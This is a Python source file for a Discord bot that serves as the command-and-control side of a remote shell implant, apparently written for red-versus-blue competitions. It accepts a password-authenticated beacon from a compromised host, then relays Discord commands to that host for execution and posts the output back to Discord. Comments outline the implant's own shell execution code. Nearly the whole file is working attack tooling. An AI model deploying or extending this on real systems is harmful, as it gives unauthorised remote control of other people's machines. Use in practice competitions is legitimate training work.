import socket

import discord
from discord.ext import commands

"""
This program uses discord.py and python networking stuff to note down remote IPs which
will accept commands to be executed then send back the results. It also handles UI on
discord including new channels for commands, a channel for logs, and an overview channel. 

Intended for red vs blue competitions.

Author: Asa Horn
"""

bot = commands.Bot(command_prefix='!')
cwd = '/'


@bot.command()
async def run(ctx, *args):
    ##################################################input
    global cwd
    cmd = ''
    for bit in args:
        cmd += bit + ' '
    print('USR CMD: ' + cmd)

    ##################################################user input editing
    #todo pull out specific character and replace with password from PPM

    ##################################################directory services
    if cmd[0:2] == 'cd':
        if ':' in cmd:   #if a drive is specified then don't fuck with it
            cwd = cmd[3:-1]
            cmd = 'dir'  #if we changed the directory print that out
        else:
            if cwd.rfind('/') == -1:
                print('Error: no / in directory string...')
            if cmd[1:-1] == '..' or cmd[2:-1] == '..':  # handle cd.. or cd ..
                cwd = cwd[0: cwd.rfind('/')]
                cmd = 'dir'  # if we changed the directory print that out
            elif cmd[3] == '/':  # handle cd /etc/....
                cwd = cmd[3:-1]
                cmd = 'dir'  # if we changed the directory print that out
            else:  # if nothing else this is a command to dive deeper into the directory
                if not (cwd[-1] == '/' or cwd[-1] == '\\'):
                    cwd += '/'  #if there is no / or \ on the end of the cwd then add one before continuing
                cwd += cmd[3:-1]
                cmd = 'dir'  # if we changed the directory print that out

    ##################################################send to remote
    print('in directory: ', cwd)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send command to payload
        print('Sending command to payload @ ' + remoteAddr[0])
        s.connect((remoteAddr[0], 22705))
        s.sendall(bytes(cwd, 'utf-8'))
        s.sendall(bytes(cmd, 'utf-8'))

        ##this is what the remote payload does
        #command = shlex.split(cmd)
        #process = Popen(command, cwd=DIR, shell=True, stdout=PIPE, stderr=PIPE)
        #stdout, stderr = process.communicate()

        err = s.recv(1024)
        out = s.recv(1024)
        stderr = err.decode("utf-8")
        stdout = out.decode("utf-8")

    ##################################################discord output
    print('----returns----')
    print(stdout)
    print(stderr)
    if stderr == 'no errors':
        stderr = ''
    if stdout == 'no output':
        stdout = ''
    await ctx.send('```' + stdout + ' ' + stderr + '```')


######################################################Command init
def main(*args):
    password = ''
    if password == '':
        if len(args) > 1:
            password = args[1]
        else:
            password = input('Password for beacon: ')

    #for now this just accepts one beacon and then goes to command, this should be a thread so it can accept multiple
    #beacons.
    beacon = 'CONNECT: ' + password
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 22704))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print('Beacon connection from', addr)
            data = conn.recv(1024)
            if data == bytes(beacon, 'utf-8'):
                conn.sendall(b'ACCEPTED')
                print('Authenticated ', addr)
                global remoteAddr
                remoteAddr = addr  # ill fix this in a sec
            else:
                conn.sendall(b'BAD CRED')
                print('Rejected ', addr, '| 10:BAD CRED')

    with open('secrets.txt') as f:
        secret = f.read()
        bot.run(secret)


if __name__ == '__main__':
    main()
